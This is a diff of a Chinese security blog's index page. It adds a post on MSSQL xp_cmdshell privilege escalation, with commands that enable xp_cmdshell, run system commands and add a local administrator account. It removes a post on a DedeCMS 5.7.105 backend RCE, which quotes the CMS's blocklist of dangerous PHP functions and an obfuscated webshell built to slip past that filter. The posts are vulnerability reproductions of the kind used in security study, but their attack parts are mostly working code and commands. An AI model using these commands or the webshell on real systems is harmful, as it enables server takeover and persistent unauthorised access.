@@ -255,6 +255,90 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91MSSQL-xp-cmdshell%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91MSSQL-xp-cmdshell%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">【漏洞复现】MSSQL xp_cmdshell提权漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-15 19:46:00 / 修改时间：19:46:28" itemprop="dateCreated datePublished" datetime="2023-03-15T19:46:00+08:00">2023-03-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="【漏洞复现】MSSQL-xp-cmdshell提权漏洞"><a href="#【漏洞复现】MSSQL-xp-cmdshell提权漏洞" class="headerlink" title="【漏洞复现】MSSQL xp_cmdshell提权漏洞"></a>【漏洞复现】MSSQL xp_cmdshell提权漏洞</h1><p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除。</p>
+<p>利用前提</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mssql数据库服务未降权（sa权限）</span><br><span class="line">已获取到数据库密码</span><br></pre></td></tr></table></figure>
+
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>获取sa账号密码后，连接上数据库，从dbo.sysobjects中查询，判断xp_cmdshell状态。有返回则为已开启。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//有返回即已开启，xtype为对象类型，xtype=&#x27;x&#x27;这里表示xp_cmdshell的对象类型为扩展存储过程。</span><br><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//只用判断存在，利用count(*)即可，返回1即存在。</span><br><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//利用EXEC启用xp_cmdshell</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGU</span><br></pre></td></tr></table></figure>
+
+<p>利用xp_cmdshell执行命令，通过xp_cmdshell执行系统命令指令如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91MSSQL-xp-cmdshell%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20230315194527733.png" alt="image-20230315194527733"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//添加账号test 密码123.com的用户</span><br><span class="line">exec master..xp_cmdshell &quot;net user test12 123.com /add&quot;</span><br><span class="line">exec master..xp_cmdshell &quot;net localgroup administrators test12 /add&quot;</span><br><span class="line">exec master..xp_cmdshell &quot;net user test12&quot;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/09/%E3%80%90%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E3%80%91%E8%87%B4%E7%BF%94OA-msglog-aspx-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -392,105 +476,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/" class="post-title-link" itemprop="url">【漏洞分析】织梦后台rce <=dedecms v5.7.105</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-03-07 21:16:16 / 修改时间：21:16:53" itemprop="dateCreated datePublished" datetime="2023-03-07T21:16:16+08:00">2023-03-07</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="【漏洞分析】织梦后台rce-lt-dedecms-v5-7-105"><a href="#【漏洞分析】织梦后台rce-lt-dedecms-v5-7-105" class="headerlink" title="【漏洞分析】织梦后台rce &lt;=dedecms v5.7.105"></a>【漏洞分析】织梦后台rce &lt;=dedecms v5.7.105</h1><h1 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h1><p><a target="_blank" rel="noopener" href="https://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7.105-UTF8.zip">https://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7.105-UTF8.zip</a></p>
-<p>原本官网是没有这个版本了，但是改一下url就可以找到历史版本。</p>
-<p>受影响的版本 &lt;=dedecms v5.7.105</p>
-<p>我们这里找到dedecms v5.7.105进行分析</p>
-<p>至于环境搭建。</p>
-<p>下载下来之后放到phpstudy上面就可以了</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞出现的文件在<code>uploads/dede/templets_one_edit.php</code></p>
-<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230306182541957.png" alt="image-20230306182541957"></p>
-<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230306182549540.png" alt="image-20230306182549540"></p>
-<p>找到漏洞点</p>
-<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230306185621108.png" alt="image-20230306185621108"></p>
-<p>在这里正则匹配了用户的文件名之后，没有对文件名的合法性进行检测，导致了攻击者可以创建任意类型文件，从而getshell。但是这里需要引用模板，而出创建模板文件的地方存在安全过滤，路径如下<code>\uploads\dede\tpl.php</code></p>
-<p>其过滤代码大概如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不允许这些字符</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$cfg_disable_funs</span>;</span><br><span class="line"><span class="variable">$cfg_disable_funs</span> = <span class="keyword">isset</span>(<span class="variable">$cfg_disable_funs</span>) ? <span class="variable">$cfg_disable_funs</span> : <span class="string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;</span><br><span class="line"><span class="variable">$cfg_disable_funs</span> = <span class="variable">$cfg_disable_funs</span>.<span class="string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (explode(<span class="string">&quot;,&quot;</span>, <span class="variable">$cfg_disable_funs</span>) <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$value</span> = str_replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>) &amp;&amp; preg_match(<span class="string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>好难绕啊，但是在tools发现了一个马给绕过去了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  @(<span class="string">&quot;Y;HJ(Z&quot;</span>^<span class="string">&quot;8H;/Z.&quot;</span>)($&#123;<span class="string">&quot;~?&#125;$&quot;</span>^<span class="string">&quot;!x8p&quot;</span>&#125;[<span class="number">1</span>]);<span class="comment">//密码是1</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230307211254494.png" alt="image-20230307211254494"></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先进入默认模板管理，新建一个模板</p>
-<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212053856.png" alt="image-20230305212053856"></p>
-<p>然后创建一个模板，内容需要免杀的shell，要不然利用不了（分析的地方写了</p>
-<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212157094.png" alt="image-20230305212157094"></p>
-<p>命名为78.htm</p>
-<p>随后来到核心-但也文档管理</p>
-<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212245028.png" alt="image-20230305212245028"></p>
-<p>创建一个页面，引用刚刚创建的78模板，然后文件名的后缀名改成php</p>
-<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212316773.png" alt="image-20230305212316773"></p>
-<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212343348.png" alt="image-20230305212343348"></p>
-<p>来到目录<code>/uploads/a/newfile1.php</code></p>
-<p>即可看到模板中的恶意代码成功执行</p>
-<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212444451.png" alt="image-20230305212444451"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -562,7 +547,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-count">174</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
